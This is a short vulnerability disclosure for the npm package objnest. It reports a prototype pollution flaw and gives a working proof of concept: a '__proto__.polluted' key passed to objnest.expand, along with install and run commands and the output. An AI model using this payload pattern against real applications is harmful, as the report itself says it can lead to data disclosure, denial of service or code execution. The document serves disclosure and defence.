# Description

`objnest` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var objnest = require("objnest")
console.log("Before : " + {}.polluted);
objnest.expand({"__proto__.polluted": "Yes! Its Polluted"})
console.log("After : " + {}.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i objnest # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
